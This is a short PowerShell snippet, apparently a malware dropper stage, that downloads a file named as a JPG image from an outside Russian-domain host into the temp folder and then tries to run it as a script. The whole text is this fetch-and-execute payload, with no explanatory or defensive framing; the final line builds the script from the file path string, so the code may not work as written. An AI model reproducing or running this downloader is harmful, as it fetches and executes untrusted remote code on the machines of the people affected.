$down = New-Object System.Net.WebClient;
$url = 'https://www.techno.ru/txt/PIC00001.jpg';
$file = $env:tmp + '\1.jpg';
$down.DownloadFile($url,$file);
[scriptblock]::Create($file).Invoke();
